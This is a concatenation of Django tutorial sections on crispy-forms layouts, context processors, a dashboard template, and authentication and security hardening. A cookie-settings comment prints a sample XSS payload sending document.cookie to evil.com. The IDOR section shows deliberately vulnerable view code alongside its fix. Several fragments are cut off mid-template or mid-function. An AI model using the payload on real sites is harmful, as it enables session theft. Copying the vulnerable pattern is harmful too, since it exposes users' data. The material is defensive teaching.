        self.helper.layout = Layout(

            # Fieldset → <fieldset><legend>Основна інформація</legend>...</fieldset>
            Fieldset('Основна інформація',
                Field('title',
                    placeholder='Назва нотатки...',
                    autofocus=True,
                    css_class='form-control-lg',  # a larger input
                ),
                Row(
                    Column('priority', css_class='col-md-4'),
                    # → <div class="col-md-4">...</div>
                    Column('notebook', css_class='col-md-8'),
                ),
            ),

            # The second Fieldset — content and tags
            Fieldset('Зміст та організація',
                Field('content', rows=8, placeholder='Текст нотатки...'),
                Field('tags'),
                Field('is_pinned'),
            ),

            # HTML — arbitrary HTML in the layout
            HTML('<hr class="my-3">'),

            # Buttons
            ButtonHolder(
                Submit('submit', 'Зберегти нотатку', css_class='btn btn-primary me-2'),
                HTML('<a href="{{ cancel_url }}" class="btn btn-outline-secondary">Скасувати</a>'),
            ),
        )

{% extends 'layouts/dashboard.html' %}
{% load crispy_forms_tags %}

{% block title %}{{ title }}{% endblock %}
{% block topbar_title %}{{ title }}{% endblock %}

{% block content %}
<div class="row justify-content-center">
    <div class="col-12 col-md-10 col-lg-8">
        <div class="card shadow-sm">
            <div class="card-body p-4">
                {% crispy form %}
                {#
                    crispy generates automatically:
                    <form method="post" id="note-form">
                      {% csrf_token %}
                      <fieldset>
                        <legend>Основна інформація</legend>
                        <div class="mb-3">

                          <input class="form-control form-control-lg" ...>
                        </div>
                        <div class="row">

                          <div class="col-md-8">...</div>
                        </div>

</div>

docs.title: 04 · Context Processors
docs.text: Problem: The Sidebar shows the list of notebooks and tags on EVERY page. If you pass them from every view — code duplication in 20 places.

docs.title: How Context Processors work
docs.text:
HTTP Request
    ↓
Middleware pipeline
    ↓
View function (view_func)
    ↓
render(request, 'template.html', {'notes': notes})  ← view context
    ↓
Django Template Engine:
    1. Collects the context from the view: {'notes': notes}
    2. AUTOMATICALLY runs each context_processor(request) from settings.py
    3. Merged context = view context + processor contexts
    4. Renders the template with the merged context

All context_processors:
  django.template.context_processors.debug  → {{ debug }}
  django.template.context_processors.request → {{ request }}
  django.contrib.auth.context_processors.auth → {{ user }}, {{ perms }}
  django.contrib.messages.context_processors.messages → {{ messages }}
  hello_app.context_processors.sidebar_context → {{ sidebar_notebooks }}, {{ sidebar_tags }}

docs.title: Writing a Context Processor
docs.text:
hello_app/context_processors.py:

from . import selectors


def sidebar_context(request):
    """
    Automatically adds to EVERY template:
      sidebar_notebooks → QuerySet of the user's notebooks
      sidebar_tags      → QuerySet of the user's tags

    Condition: only for logged-in users.
    For AnonymousUser we return {} (an empty dictionary).
    """
    if not request.user.is_authenticated:
        return {}   # ← AnonymousUser has no notebooks/tags

    return {
        'sidebar_notebooks': selectors.get_user_notebooks(request.user),
        'sidebar_tags':      selectors.get_user_tags(request.user),
    }

docs.title: When context_processors are NOT a good fit
docs.text:
# Do not use a context_processor for:
# 1. Heavy SQL queries (they run on EVERY page)
# 2. Variables specific to a single page (pass them in the render context)
# 3. Data that needs URL parameters (url kwargs are not available)

# For a heavy sidebar: caching
from django.core.cache import cache

def sidebar_context(request):
    if not request.user.is_authenticated:
        return {}

    cache_key = f'sidebar_notebooks_{request.user.id}'
    notebooks = cache.get(cache_key)
    if notebooks is None:
        notebooks = list(selectors.get_user_notebooks(request.user))
        cache.set(cache_key, notebooks, timeout=300)  # 5 minutes

    return {'sidebar_notebooks': notebooks}

{% extends 'base.html' %}

{% block body %}
<!--

    vh-100: takes 100% of the window height
    overflow-hidden: we control scrolling inside .flex-grow-1
-->
<div class="d-flex vh-100 overflow-hidden">

    <!-- ══════════════════ SIDEBAR ══════════════════ -->
    <nav id="sidebar"
         class="bg-dark text-white d-flex flex-column p-3 flex-shrink-0"
         style="width: 260px; min-width: 260px;">

        <!-- Brand -->
        <a href="{% url 'hello_app:note_list' %}"
           class="text-white text-decoration-none fw-bold fs-5 mb-4 d-block">
            <i class="bi bi-journal-text me-2 text-primary"></i>CrispyNotes

        <!-- Navigation: notes -->
        <div class="mb-3">
            <small class="text-uppercase text-secondary d-block mb-1 px-2" style="font-size:.7rem">
                Нотатки

            <ul class="nav flex-column">
                <li class="nav-item">
                    <a href="{% url 'hello_app:note_list' %}"
                       class="nav-link text-white py-1
                              {% if request.resolver_match.url_name == 'note_list' %}
                              active bg-primary rounded
                              {% endif %}">
                        <i class="bi bi-list-ul me-2"></i>Всі нотатки
                    </a>
                    {#
                        request.resolver_match.url_name:
                        Returns the name= parameter of the current URL from urls.py.
                        'note_list' → highlights the item when the user is on /notes/
                    #}
                </li>
                <li class="nav-item">
                    <a href="{% url 'hello_app:note_create' %}"
                       class="nav-link text-white py-1">
                        <i class="bi bi-plus-circle me-2"></i>Нова нотатка
                    </a>
                </li>
            </ul>
        </div>

        <!-- Notebooks (from the Context Processor) -->
        {% if sidebar_notebooks %}
        <div class="mb-3">
            <small class="text-uppercase text-secondary d-block mb-1 px-2" style="font-size:.7rem">
                Записники
            </small>
            <ul class="nav flex-column">
                {% for nb in sidebar_notebooks %}
                <li class="nav-item">
                    <a href="{% url 'hello_app:note_list' %}?notebook={{ nb.pk }}"
                       class="nav-link text-white-50 py-1 small">
                        <i class="bi bi-journal me-2"></i>
                        {{ nb.title|truncatechars:18 }}
                        {% if nb.note_count %}
                        <span class="badge bg-secondary ms-1 float-end">{{ nb.note_count }}</span>
                        {% endif %}
                    </a>
                </li>
                {% endfor %}
            </ul>
        </div>
        {% endif %}

        <!-- Tags (from the Context Processor) -->
        {% if sidebar_tags %}
        <div class="mb-auto">
            <small class="text-uppercase text-secondary d-block mb-2 px-2" style="font-size:.7rem">
                Теги
            </small>
            <div class="d-flex flex-wrap gap-1 px-2">
                {% for tag in sidebar_tags %}
                <a href="{% url 'hello_app:note_list' %}?tag={{ tag.pk }}"
                   class="badge text-decoration-none"
                   style="background-color: {{ tag.color }}; font-size: .75rem;">
                    #{{ tag.name }}
                    {% if tag.note_count %}
                    <span class="ms-1">({{ tag.note_count }})</span>
                    {% endif %}
                </a>
                {% endfor %}
            </div>
        </div>
        {% endif %}

        <!-- The user at the bottom of the sidebar -->
        <div class="mt-auto pt-3 border-top border-secondary">
            {% if request.user.is_authenticated %}
            <div class="d-flex align-items-center gap-2">
                <div class="rounded-circle bg-primary d-flex align-items-center justify-content-center"
                     style="width:32px; height:32px; flex-shrink:0;">
                    <span class="text-white small fw-bold">
                        {{ request.user.username|first|upper }}
                    </span>
                </div>
                <div class="text-truncate">
                    <div class="text-white small fw-semibold">{{ request.user.username }}</div>
                    <div class="text-white-50" style="font-size:.7rem;">{{ request.user.email }}</div>
                </div>
            </div>
            <form method="post" action="{% url 'logout' %}" class="mt-2">
                {% csrf_token %}
                <button type="submit" class="btn btn-outline-secondary btn-sm w-100">
                    <i class="bi bi-box-arrow-right me-1"></i>Вийти
                </button>
            </form>
            {% endif %}
        </div>

    </nav>
    <!-- ══════════════════ END SIDEBAR ══════════════════ -->

    <!-- ══════════════════ MAIN AREA ══════════════════ -->
    <div class="flex-grow-1 d-flex flex-column overflow-hidden">

        <!-- Topbar -->
        <header class="border-bottom bg-white px-4 py-2 d-flex align-items-center justify-content-between flex-shrink-0">

            </div>

        <!-- Page content -->

            {% block content %}{% endblock %}
        </main>

    </div>
    <!-- ══════════════════ END MAIN AREA ══════════════════ -->

</div>
{% endblock %}

docs.text:
hello_app/forms.py:

from crispy_forms.helper import FormHelper
from crispy_forms.layout import Column, Field, Fieldset, HTML, Layout, Row, Submit
from django import forms

from .models import Note, Notebook, Tag


class NoteForm(forms.ModelForm):
    class Meta:
        model  = Note
        fields = ['title', 'content', 'priority', 'notebook', 'tags', 'is_pinned']

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)

        # Restrict the queryset to this user only (IDOR protection)
        if user is not None:
            self.fields['notebook'].queryset = Notebook.objects.filter(user=user).order_by('title')
            self.fields['tags'].queryset     = Tag.objects.filter(user=user).order_by('name')
            self.fields['notebook'].empty_label = '— без записника —'

        self.helper = FormHelper()
        self.helper.layout = Layout(
            Fieldset('',
                Field('title', placeholder='Назва нотатки...', autofocus=True),
                Row(
                    Column('priority', css_class='col-md-4'),
                    Column('notebook', css_class='col-md-8'),
                ),
                Field('content', rows=8, placeholder='Текст нотатки...'),
            ),
            Fieldset('Організація',
                Field('tags'),
                Field('is_pinned'),
            ),
            HTML('<hr class="my-3">'),
            Submit('submit', 'Зберегти нотатку', css_class='btn btn-primary me-2'),
            HTML('<a href="{% url \'hello_app:note_list\' %}" class="btn btn-outline-secondary">Скасувати</a>'),
        )

from . import selectors


def sidebar_context(request):
    """
    Sidebar data for EVERY template.
    Runs automatically before every render.
    """
    if not request.user.is_authenticated:
        return {}   # AnonymousUser → an empty dict

    return {
        'sidebar_notebooks': selectors.get_user_notebooks(request.user),
        'sidebar_tags':      selectors.get_user_tags(request.user),
    }

docs.title: Tutorial 05 — Django Authentication and Security
docs.text:
This tutorial walks you through the full security stack of a Django application: login/logout → password reset → object protection → groups for shared access.

The project — notes_chat_app — is a notes manager with real-time group chat. In this section we examine the security layers that are already implemented in the application. You will see how security is "woven" into real code rather than existing separately.

Step-by-step implementation 1. Step 0 — Launching the project (Docker) 2. Step 1 — Settings: auth + security 3. Step 2 — URLs: connecting the built-in auth views 4. docs.title: 01 · AUTH BASICS
docs.text:
The main question: Who are you and what are you allowed to do?

These two questions are the foundation of any security system. Django answers them through two different systems.

docs.title: Analogy — a passport and a concert ticket
docs.text:
• Passport = Authentication (AuthN): "Who are you?" — confirms identity. A guard checks the document and makes sure it is genuine.
  • Ticket = Authorization (AuthZ): "Where are you allowed to go?" — determines rights. The cashier checks the ticket and decides where you can sit (VIP or the stalls).

At the airport: security checks your passport (AuthN), then your boarding pass (AuthZ). A passport without a ticket — you won't be let through. A ticket without a passport — neither.

docs.title: Table: AuthN vs AuthZ
docs.text: Authentication (AuthN) Authorization (AuthZ) Question Who are you? What are you allowed to do? Answer Password check Check of rights on the object Django tool authenticate(), login() @login_required, get_object_or_404 Where it is checked AuthenticationMiddleware In each view separately What if it fails Form with an error 302 Redirect or 404/403

docs.title: Django Auth components
docs.text:
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Verify credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: looks up the User with username='alice'
# → Checks the PBKDF2 password hash in the DB
# → Returns a User object if it matches, or None

# 2. Start a session after a successful login:
if user is not None:
    login(request, user)   # ← creates a session_id in the DB + a cookie in the browser
    # Now request.user = alice in all subsequent requests

# 3. End the session:
logout(request)   # ← deletes the session record from the DB + forcibly clears the cookie

docs.title: Middleware chain: who sets request.user
docs.text:
Every request passes through the ENTIRE middleware chain (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — logging/displaying errors in dev
2. DebugToolbarMiddleware    — Django Debug Toolbar
3. SecurityMiddleware        — HTTPS redirect, HTTP security headers
4. SessionMiddleware         — reads Cookie: sessionid=... → loads the session from the DB
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — checks csrfmiddlewaretoken in POST requests
7. AuthenticationMiddleware  — reads the session → sets request.user
   │                           If there is a session → request.user = User(id=42)
   │                           If there is none     → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY header
   │
   ▼
View function (request.user is already set!)

Middleware order matters: - SessionMiddleware must come before AuthenticationMiddleware — Auth reads the session - CsrfViewMiddleware before the View — it checks CSRF before any view is called - SessionMiddleware before CsrfViewMiddleware — CSRF uses the session

docs.title: @login_required — what it does and where it lives
docs.text:
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← decorator, checks request.user.is_authenticated
def note_list(request):
    # If request.user = AnonymousUser:
    #   → redirect to LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # If request.user = User(id=42):
    #   → runs the view normally
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})

# settings.py — where to redirect users who are not logged in:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # where to go AFTER a successful login
LOGOUT_REDIRECT_URL = '/accounts/login/' # where to go AFTER logout

Important: @login_required is only AuthN ("are you logged in?"). It does NOT check whether this particular note belongs to you. That requires a separate AuthZ step in the view (see Step 6).

docs.title: 02 · SESSIONS
docs.text: The problem: HTTP is a stateless protocol. Every request is as if it were the "first". The server doesn't know who you are unless you send proof.

docs.title: Analogy — a loyalty card at a café
docs.text:
Imagine a café where you earn points for every coffee. Without a card, the waiter forgets you after every visit. With a card, the points accumulate.

Session cookie = loyalty card: the browser stores it and automatically presents it with every request.

docs.title: Step-by-step flow: Login → Cookie → Next request
docs.text:
STEP 1: Alice clicks "Log in"
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → checks csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Response: 302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

STEP 2: The browser stores the cookie. Alice sees /notes/
─────────────────────────────────────────────────────────────────────────
The browser stores: sessionid=xK9mPq (in the browser's protected storage)

STEP 3: Alice's next request (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Browser:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← sent automatically!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

STEP 4: Logout
─────────────────────────────────────────────────────────────────────────
Browser:  POST /accounts/logout/  (with the CSRF token in the POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Response: 302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Browser:  Deletes the cookie. request.user → AnonymousUser.

docs.title: The cookie in DevTools: how to see the session
docs.text:
Chrome DevTools → Application → Storage → Cookies → http://localhost

Field         Value
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (32-character random key)
Domain        localhost
Path          /
Expires       (in 2 weeks by default)
Size          ~100 B
HttpOnly      ✓  (JS cannot read it!)
SameSite      Lax

Try it in the Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid is missing — HttpOnly!)

docs.title: Cookie settings in settings.py
docs.text:
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS cannot read sessionid via document.cookie
#   Protection against XSS attacks that try to steal the cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → with HttpOnly: sessionid is absent from document.cookie → the attack is useless

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": the cookie is sent only from the same site OR
#   on navigational GET requests (links)
#   CSRF protection: evil.com cannot send a POST with your cookie
#   "Strict" — stricter: the cookie is not sent even when following external links
#   "None" — dangerous without the Secure (HTTPS) flag

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS can read csrftoken (needed for fetch/axios requests with a CSRF header)
#   If you don't use JS for forms → True for strict protection

# Production HTTPS (uncomment when you have an SSL certificate):
# SESSION_COOKIE_SECURE = True   # cookie only over HTTPS (not HTTP)
# CSRF_COOKIE_SECURE = True

docs.title: 03 · PASSWORD SECURITY
docs.text: Django provides a complete password management system "out of the box" via django.contrib.auth. You don't need to write a single view for login, logout, password reset or change.

docs.title: What include('django.contrib.auth.urls') connects
docs.text:
# notes_project/urls.py:
path("accounts/", include("django.contrib.auth.urls")),

This automatically registers:

URL View Name (for {% url %}) Template (you need to create it) /accounts/login/ LoginView login registration/login.html /accounts/logout/ LogoutView logout (redirect, no template) /accounts/password_change/ PasswordChangeView password_change registration/password_change_form.html /accounts/password_change/done/ PasswordChangeDoneView password_change_done registration/password_change_done.html /accounts/password_reset/ PasswordResetView password_reset registration/password_reset_form.html /accounts/password_reset/done/ PasswordResetDoneView password_reset_done registration/password_reset_done.html /accounts/reset/<uidb64>/<token>/ PasswordResetConfirmView password_reset_confirm registration/password_reset_confirm.html /accounts/reset/done/ PasswordResetCompleteView password_reset_complete registration/password_reset_complete.html

Conclusion: 8 URLs + 7 views are already written by Django — you only write the HTML templates.

docs.title: Password Reset Flow — 5 steps
docs.text:
Step 1: /accounts/password_reset/
─────────────────────────────────────────────────────────────────────────
Alice forgot her password → enters her email in the form
→ password_reset_form.html

Step 2: Django processes the POST
─────────────────────────────────────────────────────────────────────────
Django looks for a User with that email (says nothing if none is found —
safe behavior: we don't reveal whether such an email exists)
Generates a unique token: sha256(user_pk + timestamp + SECRET_KEY)
Sends an email with a link:
  /accounts/reset/<uidb64>/<token>/

[DEV: EMAIL_BACKEND = console → the email is printed to docker logs]
[PROD: EMAIL_BACKEND = smtp → a real email]

Step 3: /accounts/password_reset/done/
─────────────────────────────────────────────────────────────────────────
Django shows: "Check your email" (regardless of whether the email was found)
→ password_reset_done.html

Step 4: /accounts/reset/<uidb64>/<token>/
─────────────────────────────────────────────────────────────────────────
Alice follows the link from the email
Django: uidb64 → user_pk, token → verifies the signature
Is it valid? (72 hours, single-use — invalidated after use)
If OK → form for the new password + password validators
→ password_reset_confirm.html

Step 5: Success → /accounts/reset/done/
─────────────────────────────────────────────────────────────────────────
Password saved (hashed with PBKDF2 with a salt) → all of this user's sessions are reset
→ password_reset_complete.html

docs.title: How PBKDF2 stores passwords
docs.text:
# What is stored in the DB (auth_user.password):
'pbkdf2_sha256$600000$salt$hash'
#  ↑algorithm   ↑iterations  ↑salt ↑hash

# Plain text is never stored!
# Even Django doesn't know the original password — it only checks the hash.

# Verification:
# authenticate(request, username='alice', password='mysecret')
# → pbkdf2_sha256(600000 iterations, 'mysecret' + stored_salt)
# → compares with stored_hash
# → returns a User or None

# Why 600000 iterations?
# If a hacker stole the DB → brute force:
#   SHA-256 without stretching: 10 billion attempts/sec
#   PBKDF2 with 600000 iter:  ~10 000 attempts/sec (1 000 000 times slower!)

docs.title: Password Validators
docs.text:
# settings.py — 4 built-in validators:
AUTH_PASSWORD_VALIDATORS = [
    # Is the password similar to the username / email / first_name?
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    # At least 8 characters (configurable: "OPTIONS": {"min_length": 10})
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator"},
    # Is it in the list of 20 000 most common passwords? ("password", "123456", "qwerty"...)
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    # Does it consist only of digits?
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]

# Validators run:
# 1. On registration (UserCreationForm)
# 2. On password change (PasswordChangeForm, PasswordResetConfirmView)
# 3. On set_password() → validate_password()
#    NOT on User.objects.create_user() unless you call validate_password()!

docs.title: 04 · OBJECT-LEVEL PERMISSIONS
docs.text: The most common vulnerability in web applications (OWASP A01): Broken Access Control — a user gains access to someone else's data.

docs.title: What IDOR (Insecure Direct Object Reference) is
docs.text:
Alice is registered. She sees the URL of her note: /notes/42/edit/
She thinks: "What happens if I change 42 to 43?"
Alice goes to: /notes/43/edit/
If the view doesn't check the owner → Alice edits BOB's note!

This is an IDOR attack — Insecure Direct Object Reference.
OWASP A01 (Broken Access Control) — the most frequent cause of data leaks.

docs.title: The difference between AuthN and AuthZ by example
docs.text:
# ─── PROBLEM: @login_required is only AuthN, not AuthZ! ─────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk)   # ← IDOR vulnerability!
    # Alice is logged in → @login_required lets her through ✓
    # But note(pk=43) belongs to Bob → Alice edits someone else's data! ✗

# Generated SQL:
# SELECT * FROM note WHERE pk = 43
# → returns Bob's note! No user_id check at all!


# ─── SOLUTION: add user= to get_object_or_404 ───────────────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)   # ← AuthZ ✓
    # pk=43 + user=Alice
    # SQL: SELECT * FROM note WHERE pk=43 AND user_id=42
    # Bob has note(pk=43, user_id=99) → user_id=42 doesn't match → 404

Golden rule: 

@login_required               = "are you logged in?"        (AuthN)
get_object_or_404(            = "is this object yours?"     (AuthZ)
    Note, pk=pk,
    user=request.user
)

Why 404 and not 403? 

403 Forbidden → we tell them: "This resource exists, but you don't have access"
                The hacker knows id=43 exists → may try other attacks

404 Not Found  → we tell them: "No such resource exists"
                The hacker doesn't know whether it exists → less information for an attack

Principle: don't reveal the existence of other people's objects.

        messages.warning(request, 'Нотатку видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})


@login_required

docs.title: Pattern for shared objects (owner OR group member)
docs.text:
# Notes can belong to a group → the check is more complex:
from django.db.models import Q

@login_required
def note_detail(request, pk):
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(
            Q(user=request.user) | Q(group__in=user_groups)
        ),
        pk=pk
    )
    # Alice sees the note if:
    #   note.user == Alice (personal note)
    #   OR note.group in Alice.groups.all() (group note)
    #
    # SQL:
    # SELECT * FROM note
    # WHERE pk = 43
    #   AND (user_id = 42 OR group_id IN (1, 3))
    # → If neither one nor the other → 404
    return render(request, 'notes_app/note_detail.html', {'note': note})

docs.title: Table of protected views in notes_app
docs.text: View Protection How it is implemented note_list @login_required Selector Q(user=user) \| Q(group__in=...) note_edit @login_required + owner Q-filter for access, then note.user != request.user for editing note_delete @login_required + owner The same notebook_edit @login_required + owner get_object_or_404(Notebook, pk=pk, user=request.user) notebook_delete @login_required + owner The same group_detail @login_required + membership get_group_with_members(pk, user) → None if not a member group_delete @login_required + membership group.user_set.filter(pk=user.pk).exists()

docs.title: 05 · GROUP SHARING
docs.text: The idea: Alice wants to share notes with her team. She creates the group "Development Team" and adds Bob. Both of them see notes and shopping lists tagged with this group.

docs.title: Django's built-in Group model
docs.text:
Django already has a ready-made Group model in django.contrib.auth:

from django.contrib.auth.models import Group

# Every Group has:
#   id          — PK
#   name        — name ('Family', 'Team', 'Class')
#   user_set    — M2N relationship with User (via the auth_user_groups junction table)
#   permissions — M2N relationship with Permission (for role-based access — not our case)

# In notes_app we use Group for SHARING DATA between users,
# not for the Django Permission System (is_staff, is_superuser, permissions).

docs.title: ER diagram: User, Group, Note, ShoppingList
Q-filter: "mine or the group's"
docs.text:
# notes_app/selectors.py
from django.db.models import Q

def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """Returns the user's notes + notes of the groups they belong to."""
    user_groups = user.groups.all()   # all of the user's groups (1 SQL)
    qs = Note.objects.filter(
        Q(user=user) |               # own notes
        Q(group__in=user_groups),    # notes of groups where user is a member
        is_archived=archived,
    ).select_related('notebook', 'group').prefetch_related('tags')
    # ...
    return qs.order_by('-is_pinned', '-priority', '-updated_at')

Alice is in the groups: [Team(id=1), Family(id=3)]

SQL (simplified):
  SELECT * FROM note
  WHERE (user_id = 42)              -- Alice's personal notes
     OR (group_id IN (1, 3))        -- notes of her groups
  AND is_archived = FALSE
  ORDER BY is_pinned DESC, priority DESC, updated_at DESC

docs.title: Comparison of sharing approaches
docs.text: M2M shared_with (TodoList) Group FK (Note, ShoppingList) Where TodoList.shared_with = ManyToManyField(User) Note.group = ForeignKey(Group) Share with whom Specific users All group members Management Through a form with checkboxes Through /groups/<pk>/ When it fits "Share with Bob specifically" "Share with the whole team" Deletion The ManyToMany record is deleted SET_NULL → the note becomes personal

docs.title: 06 · SECURITY SETTINGS
docs.text: Django has lots of security settings. Most are "off" by default so as not to break localhost development. In production they need to be turned on.

docs.title: Table: each setting and what it protects against
docs.text: Setting Value What it protects against SESSION_COOKIE_HTTPONLY = True JS doesn't read sessionid XSS → Session Hijacking SESSION_COOKIE_SAMESITE = "Lax" Cookie only from the same site CSRF via cross-site forms CSRF_COOKIE_HTTPONLY = False JS reads csrftoken (False = for fetch/axios) X_FRAME_OPTIONS = "DENY" Forbids <iframe> embedding Clickjacking attacks SECURE_CONTENT_TYPE_NOSNIFF = True Don't "guess" the MIME type XSS via forged files DEBUG = False Hides stack traces Leaking SECRET_KEY and code ALLOWED_HOSTS = ['mysite.com'] Only this domain HTTP Host header attacks CSRF_TRUSTED_ORIGINS = [...] Allowed HTTPS origins CSRF via ngrok/proxy

docs.title: What leaks with DEBUG = True in production
docs.text:
A server error with DEBUG=True shows:
  ✗ The full stack trace (file paths, function names, lines of code)
  ✗ The values of ALL local variables at the moment of the error
  ✗ SECRET_KEY leaks! (a hacker can forge session cookies and CSRF tokens)
  ✗ All SQL queries are kept in memory → memory leak under load
  ✗ INSTALLED_APPS, DATABASES, MIDDLEWARE — the whole config is visible in the browser

DEBUG = False + ALLOWED_HOSTS = ['mysite.com'] are mandatory in production.

docs.title: Production HTTPS (uncomment on the server)
docs.text:
# settings.py — commented out in dev (so that localhost works over HTTP):

# SESSION_COOKIE_SECURE = True
# ↑ The cookie is sent ONLY over HTTPS
# Without this: a man-in-the-middle can intercept sessionid over HTTP

# CSRF_COOKIE_SECURE = True
# ↑ The same for the CSRF cookie

# SECURE_SSL_REDIRECT = True
# ↑ Any HTTP request → 301 Moved Permanently → HTTPS

# SECURE_HSTS_SECONDS = 31536000  # 1 year
# ↑ The browser remembers: ONLY HTTPS for 1 year
# (HTTP Strict Transport Security header)
# WARNING: once enabled — hard to roll back! The browser caches it and ignores HTTP.

docs.title: ngrok and CSRF_TRUSTED_ORIGINS
docs.text:
notes_chat_app uses ngrok for public access. Django checks the Origin header on POST over HTTPS:

# settings.py (already implemented):
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []
# = ['https://fawn-natural-mayfly.ngrok-free.app']

# .env:
# NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app

# Without CSRF_TRUSTED_ORIGINS:
# POST /accounts/login/ via ngrok → 403 Forbidden: CSRF verification failed
# Origin: https://fawn-natural-mayfly.ngrok-free.app — not in trusted origins!

docs.text:
# 1. Copy the configuration
cp .env.example .env
# Edit .env: SECRET_KEY, POSTGRES_*, NGROK_* if needed

# 2. Bring up the whole stack (PostgreSQL + Redis + Web + Nginx + ngrok + Selenium)
docker compose up --build

# 3. View the logs (the password reset email will be here)

# 4. Open in the browser
open http://localhost   # via nginx

open http://localhost:8001   # directly to Uvicorn

# 5. Demo data (3 users, groups, notes)

docs.title: Step 2 — URLs
docs.text:
Location: notes_project/urls.py

from django.contrib import admin
from django.urls import path, include
from debug_toolbar.toolbar import debug_toolbar_urls

urlpatterns = [
    path("admin/", admin.site.urls),

    # Django built-in auth: login, logout, password change, password reset
    # Registers 8 URLs in a single line!
    path("accounts/", include("django.contrib.auth.urls")),

    # Our application: notes, groups, registration, WebSocket chat
    path("", include("notes_app.urls", namespace="notes_app")),
] + debug_toolbar_urls()

Location: notes_app/urls.py

from django.urls import path
from . import views

app_name = 'notes_app'

urlpatterns = [
    # ── Notes ──────────────────────────────────────────────────────────────
    path('notes/',              views.note_list,    name='note_list'),
    path('notes/new/',          views.note_create,  name='note_create'),
    path('notes/<int:pk>/',     views.note_detail,  name='note_detail'),
    path('notes/<int:pk>/edit/',   views.note_edit,   name='note_edit'),
    path('notes/<int:pk>/delete/', views.note_delete, name='note_delete'),

    # ── Notebooks ──────────────────────────────────────────────────────────
    path('notebooks/',               views.notebook_list,   name='notebook_list'),
    path('notebooks/new/',           views.notebook_create, name='notebook_create'),
    path('notebooks/<int:pk>/edit/', views.notebook_edit,   name='notebook_edit'),
    path('notebooks/<int:pk>/delete/', views.notebook_delete, name='notebook_delete'),

    # ── Auth (custom — registration not in auth.urls) ──────────────────────
    path('register/', views.register, name='register'),

    path('groups/<int:pk>/',         views.group_detail,  name='group_detail'),

    path('groups/<int:pk>/chat/',    views.group_chat,    name='group_chat'),
]

# notes_app/views.py
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login


def register(request):
    """
    Registering a new user.
    After successful registration — auto-login and redirect to note_list.
    """
    if request.user.is_authenticated:
        # Already logged in → don't show the registration form
        return redirect('notes_app:note_list')

    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()
            # auto-login: don't force the user to log in right after registering
            login(request, user)
            messages.success(request, f'Вітаємо, {user.username}! Акаунт створено.')
            return redirect('notes_app:note_list')
    else:
        form = UserCreationForm()

    return render(request, 'registration/register.html', {'form': form})

docs.title: Step 6 — Object-Level Permissions
docs.text:
The pattern applies in every view that takes a pk and modifies data.

# notes_app/views.py — full implementation of note_edit with all checks:

from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, redirect, render
from django.contrib import messages
from django.db.models import Q
from .models import Note
from .forms import NoteForm
from . import services, selectors


@login_required
def note_edit(request, pk):
    """
    Editing a note — two levels of checks:
    1. @login_required          → AuthN: logged in?
    2. Q(user) | Q(group)       → read access: own or group note?
    3. note.user == request.user → AuthZ write: only the owner may edit

    Why a Q-filter and not get_object_or_404(..., user=request.user)?
      get_object_or_404(Note, pk=pk, user=request.user) would block
      group members from viewing the note via the URL /notes/<pk>/edit/.
      The real logic: a group member may READ the note (sees it),
      but only the owner may EDIT it.
    """
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(Q(user=request.user) | Q(group__in=user_groups)),
        pk=pk,
    )
    # ↑ SQL: SELECT * FROM note WHERE pk=<pk> AND (user_id=<uid> OR group_id IN (...))
    # → 404 if neither the owner nor a group member

